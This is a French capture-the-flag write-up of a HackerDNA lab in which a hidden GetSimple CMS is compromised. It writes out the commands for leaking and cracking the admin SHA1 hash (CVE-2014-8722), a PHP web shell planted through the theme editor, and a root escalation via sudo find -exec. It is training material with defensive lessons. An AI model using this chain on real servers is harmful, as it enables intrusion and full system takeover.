# Compte rendu : Hidden CMS Breach

Plateforme : [HackerDNA](https://hackerdna.com/labs/hidden-cms-breach)
Auteur : SRH
Catégorie : Sécurité Web & API
Difficulté : Moyenne
Tags : Énumération Web, GetSimple CMS, CVE-2014-8722, Cassage SHA1, RCE, Éditeur de Thème, Escalade de Privilèges, Sudo Find
XP : +400 XP

## Scénario
Un serveur web se trouve tranquillement dans un coin du réseau, mais quelque chose vous dit qu'il y a plus qu'il n'y paraît. La page d'accueil révèle peu, mais sous la surface se trouve une application complète attendant d'être découverte. Grâce à une énumération minutieuse et une exploitation ciblée, l'objectif est de transformer un simple serveur web en accès complet au système.

Prérequis : ligne de commande Linux de base, fondamentaux des applications web, familiarité avec le protocole HTTP, connaissances réseau de base.

## Chaîne d'Attaque
[Reconnaissance] → [Découverte de GetSimple CMS] → [Fuite du hash admin (CVE-2014-8722)] → [Cassage SHA1] → [Connexion admin] → [RCE via l'éditeur de thème] → [Flag user] → [Énumération sudo] → [Escalade via sudo find] → [Flag root] → 🚩

## Étape 1 — Reconnaissance
Le scan Nmap révèle un seul port ouvert : le port 80 (HTTP) avec nginx. La page d'accueil affiche une bannière ASCII avec les instructions de la mission, notamment les emplacements des flags /home/flag_user.txt et /root/flag_root.txt.

nmap -sV <IP>

Le fichier robots.txt révèle des informations critiques : le hostname getsimple.hdna et un répertoire /new_website/ bloqué aux crawlers mais accessible directement.

curl http://<IP>/robots.txt

Résultat attendu :
# Hostname: http://getsimple.hdna
User-agent: *
Disallow: /new_website/

Le hostname getsimple.hdna confirme la présence de GetSimple CMS. Le panneau d'administration est accessible sur /new_website/admin/.

## Étape 2 — Fuite du hash admin (CVE-2014-8722)
GetSimple CMS 3.3.16 est vulnérable à la CVE-2014-8722 : une divulgation d'informations qui expose les données utilisateurs via un accès direct aux fichiers, sans authentification. Le hash du mot de passe admin est stocké dans /data/users/<username>.xml.

curl -s http://<IP>/new_website/data/users/admin.xml

Résultat attendu :
<?xml version="1.0" encoding="UTF-8"?>
<item>
  <USR>admin</USR>
  <PWD>34391d961419bb65a1e8e2bb7f95581f35971238</PWD>
  <EMAIL>admin@getsimple.hdna</EMAIL>
  ...
</item>

Le hash extrait est un SHA1 non salé.

## Étape 3 — Cassage du hash SHA1
On casse le hash hors ligne avec John the Ripper et rockyou.txt.

echo '34391d961419bb65a1e8e2bb7f95581f35971238' > /tmp/hash.txt
john --format=raw-sha1 --wordlist=/usr/share/wordlists/rockyou.txt /tmp/hash.txt

Résultat attendu : le mot de passe admin est trouvé (de type 1234yellow).

## Étape 4 — Connexion admin et RCE via l'éditeur de thème
On se connecte au panneau admin avec les identifiants récupérés, puis on navigue vers Theme > Edit Theme (theme-edit.php). Le fichier template.php du thème Innovation est éditable. On y injecte un web shell PHP.

<?php if(isset($_REQUEST['cmd'])){passthru($_REQUEST['cmd']);}?>

La sauvegarde nécessite le nonce CSRF présent dans le formulaire d'édition. On envoie le payload via une requête POST :

curl -s -X POST "http://<IP>/new_website/admin/theme-edit.php?t=Innovation&f=template.php" \
  -b cookies.txt \
  -d "nonce=<NONCE>&content=<PAYLOAD>&edited_file=Innovation/template.php&submitsave=Save+Changes"

On teste l'exécution de commandes via le web shell injecté sur le site principal :

curl -s "http://<IP>/new_website/index.php?cmd=id"
# → uid=100(nginx) gid=101(nginx)

## Étape 5 — Flag utilisateur
On utilise le web shell pour lire le flag utilisateur.

curl -s "http://<IP>/new_website/index.php?cmd=cat%20/home/flag_user.txt"

Flag User : <USER_FLAG>

## Étape 6 — Énumération sudo
On vérifie les droits sudo de l'utilisateur nginx via le web shell :

curl -s "http://<IP>/new_website/index.php?cmd=sudo%20-l"

Résultat attendu :
User nginx may run the following commands on host:
    (root) NOPASSWD: /usr/bin/find

## Étape 7 — Flag root via sudo find
find avec l'option -exec permet d'exécuter une commande en root (GTFOBins). On lit directement le flag root.

curl -s "http://<IP>/new_website/index.php?cmd=sudo%20find%20/etc/passwd%20-exec%20cat%20/root/flag_root.txt%20%5C%3B"

Flag Root : <ROOT_FLAG>

## Conclusion
Ce lab illustre une chaîne d'exploitation complète : une énumération web découvre une installation GetSimple CMS cachée, une divulgation d'informations (CVE-2014-8722) expose le hash SHA1 non salé de l'administrateur, le cassage du hash mène à une RCE via l'éditeur de thème, et une règle sudo mal configurée (find en NOPASSWD) permet l'escalade finale vers root.

## Leçons Apprises
1. Toujours vérifier robots.txt et les fichiers de données des CMS (comme /data/users/) qui peuvent être accessibles directement.
2. Ne jamais stocker de hashes de mots de passe dans des fichiers accessibles sans authentification (CVE-2014-8722).
3. Utiliser des algorithmes de hachage robustes et salés (bcrypt, Argon2) au lieu de SHA1/MD5 non salés.
4. Restreindre l'accès à l'éditeur de thème du CMS aux seuls administrateurs de confiance.
5. Auditer les règles sudo : find avec -exec permet une exécution de commande arbitraire en root.

Les noms des défis et toute propriété intellectuelle de tiers restent la propriété de leurs détenteurs respectifs.
